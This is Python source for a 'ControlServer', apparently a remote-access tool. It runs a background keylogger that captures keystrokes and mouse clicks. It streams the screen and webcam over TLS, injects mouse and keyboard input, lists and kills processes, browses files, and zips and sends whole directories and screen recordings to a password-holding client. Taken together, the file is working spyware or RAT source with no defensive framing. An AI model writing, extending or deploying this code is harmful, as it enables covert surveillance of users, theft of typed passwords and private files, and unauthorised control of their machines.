import socket
import ssl
import cv2
import mss
import numpy as np
import pyautogui
import struct
import threading
import random
import psutil
import logging
import string
import json
import subprocess
import time
import re
import zipfile
import sys
from pathlib import Path
from pynput import keyboard, mouse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ControlServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port_stream = 9998
        self.port_cmd = 9999
        self.cert_file = Path("server.crt")
        self.key_file = Path("server.key")
        self.password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        
        self.running = True
        self.is_streaming = False
        self.stream_mode = "SCREEN"
        self.is_recording = False
        self.recorder = None
        self.record_path = Path("temp_record.mp4")
        
        try:
            w, h = pyautogui.size()
            self.native_res = (w, h) if w > 0 else (1280, 720)
        except: self.native_res = (1280, 720)

        self.activity_logs = []
        self.k_listener, self.m_listener = self.start_keylogger()
        self.ssl_context = self.setup_ssl()
        
        print(f"\n{'='*50}\nCONTROL SERVER - ONLINE\nIP: {self.get_local_ip()}\nPASS: {self.password}\n{'='*50}\n")

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(('8.8.8.8', 1)); ip = s.getsockname()[0]
        except: ip = '127.0.0.1'
        finally: s.close()
        return ip

    def setup_ssl(self):
        if not (self.cert_file.exists() and self.key_file.exists()): self.generate_certs()
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
        return context

    def generate_certs(self):
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, u"localhost")])
        cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365)).sign(key, hashes.SHA256())
        with open(self.key_file, "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(self.cert_file, "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))

    def start_keylogger(self):
        def on_press(key):
            try: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Key: {key.char}")
            except: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Special: {key}")
        def on_click(x, y, button, pressed):
            if pressed: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Mouse {button} at ({x}, {y})")
        k = keyboard.Listener(on_press=on_press); k.start()
        m = mouse.Listener(on_click=on_click); m.start()
        return k, m

    def stop(self):
        self.running = False
        if self.k_listener: self.k_listener.stop()
        if self.m_listener: self.m_listener.stop()
        if self.recorder: self.recorder.release()

    def stream_handler(self):
        raw_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_s.settimeout(1.0)
        raw_s.bind((self.host, self.port_stream))
        raw_s.listen(10)
        secure_s = self.ssl_context.wrap_socket(raw_s, server_side=True)
        camera = cv2.VideoCapture(0)
        while self.running:
            try:
                conn, _ = secure_s.accept()
                threading.Thread(target=self.handle_stream_client, args=(conn, camera), daemon=True).start()
            except socket.timeout: continue
            except Exception as e:
                logging.error(f"Stream Accept Error: {e}")
                continue
        camera.release()

    def handle_stream_client(self, conn, camera):
        with mss.mss() as sct:
            try:
                while self.running:
                    if self.stream_mode == "SCREEN":
                        img = np.array(sct.grab(sct.monitors[1]))
                        frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    else:
                        ret, frame = camera.read()
                        if not ret: frame = np.zeros((480, 640, 3), np.uint8)
                    
                    if self.is_recording and self.recorder:
                        self.recorder.write(cv2.resize(frame, (1280, 720)))

                    if not self.is_streaming: time.sleep(0.5); continue
                    _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 45])
                    data = enc.tobytes()
                    # Use !I for fixed 4-byte network order
                    conn.sendall(struct.pack("!I", len(data)) + data)
            except: pass
            finally: conn.close()

    def command_handler(self):
        raw_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_s.settimeout(1.0)
        raw_s.bind((self.host, self.port_cmd))
        raw_s.listen(10)
        secure_s = self.ssl_context.wrap_socket(raw_s, server_side=True)
        while self.running:
            try:
                conn, _ = secure_s.accept()
                threading.Thread(target=self.handle_command_client, args=(conn,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e:
                logging.error(f"Command Accept Error: {e}")
                continue

    def handle_command_client(self, conn):
        try:
            pwd = conn.recv(1024).decode()
            if pwd != self.password: 
                res = json.dumps({"status": "FAIL", "msg": "Invalid Password"}).encode()
                conn.sendall(struct.pack("!I", len(res)) + res)
                conn.close(); return
            
            res = json.dumps({"status": "OK", "w": self.native_res[0], "h": self.native_res[1]}).encode()
            conn.sendall(struct.pack("!I", len(res)) + res)

            while self.running:
                h = conn.recv(4)
                if not h: break
                sz = struct.unpack("!I", h)[0]
                req = b""
                while len(req) < sz:
                    chunk = conn.recv(min(sz-len(req), 8192))
                    if not chunk: break
                    req += chunk
                if len(req) < sz: break
                cmd = json.loads(req.decode())
                t = cmd['type']

                if t == "MOUSE": pyautogui.click(cmd['x'], cmd['y'], button=cmd.get('btn', 'left'))
                elif t == "KEY": pyautogui.press(cmd['key'])
                elif t == "STREAM_CTRL": self.is_streaming = cmd['active']; self.stream_mode = cmd.get('mode', "SCREEN")
                elif t == "LIST_PROCS":
                    procs = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
                    res_p = json.dumps(procs).encode()
                    conn.sendall(struct.pack("!I", len(res_p)) + res_p)
                elif t == "KILL_PROC":
                    try: psutil.Process(cmd['pid']).terminate(); conn.sendall(b"OK")
                    except: conn.sendall(b"FAIL")
                elif t == "LIST_APPS":
                    apps = []
                    for p in [Path("/usr/share/applications"), Path("/var/lib/snapd/desktop/applications"), Path.home()/".local/share/applications"]:
                        if p.exists():
                            for f in p.glob("*.desktop"):
                                with open(f, 'r', errors='ignore') as df:
                                    content = df.read()
                                    name = re.search(r'^Name=(.*)', content, re.M)
                                    exec_c = re.search(r'^Exec=(.*)', content, re.M)
                                    if name and exec_c:
                                        apps.append({"name": name.group(1).strip(), "exec": re.sub(r'%[a-zA-Z]', '', exec_c.group(1)).strip(), "sw": "Application" in content})
                    apps.sort(key=lambda x: x['sw'], reverse=True)
                    res_a = json.dumps(apps).encode()
                    conn.sendall(struct.pack("!I", len(res_a)) + res_a)
                elif t == "LIST_FILES":
                    p = Path(cmd['path'])
                    files = []
                    if p.exists() and p.is_dir():
                        for item in p.iterdir():
                            try: files.append({"name": item.name, "is_dir": item.is_dir(), "size": item.stat().st_size if not item.is_dir() else 0})
                            except: pass
                    res_f = json.dumps(files).encode()
                    conn.sendall(struct.pack("!I", len(res_f)) + res_f)
                elif t == "DOWNLOAD":
                    p = Path(cmd['path'])
                    if p.is_dir():
                        zip_p = Path("temp.zip")
                        with zipfile.ZipFile(zip_p, 'w') as z:
                            for file in p.rglob('*'): z.write(file, file.relative_to(p))
                        p = zip_p
                    if p.is_file():
                        sz_f = p.stat().st_size
                        conn.sendall(struct.pack("!Q", sz_f))
                        with open(p, "rb") as f:
                            while chunk := f.read(32768): conn.sendall(chunk)
                    else: conn.sendall(struct.pack("!Q", 0))
                elif t == "REC_STOP":
                    self.is_recording = False
                    if self.recorder: self.recorder.release(); self.recorder = None
                    if self.record_path.exists():
                        conn.sendall(struct.pack("!Q", self.record_path.stat().st_size))
                        with open(self.record_path, "rb") as f:
                            while chunk := f.read(32768): conn.sendall(chunk)
                    else: conn.sendall(struct.pack("!Q", 0))
                elif t == "SCREENSHOT":
                    with mss.mss() as sct:
                        img = np.array(sct.grab(sct.monitors[1]))
                        if cmd['mode'] == "WEBCAM":
                            cap = cv2.VideoCapture(0); ret, img = cap.read(); cap.release()
                        _, enc = cv2.imencode('.jpg', img); raw = enc.tobytes()
                        conn.sendall(struct.pack("!I", len(raw)) + raw)
                elif t == "GET_LOGS":
                    res_l = json.dumps(self.activity_logs).encode()
                    conn.sendall(struct.pack("!I", len(res_l)) + res_l)
        except: pass
        finally: conn.close()

if __name__ == "__main__":
    server = ControlServer()
    t1 = threading.Thread(target=server.stream_handler, daemon=True); t1.start()
    t2 = threading.Thread(target=server.command_handler, daemon=True); t2.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
        sys.exit(0)
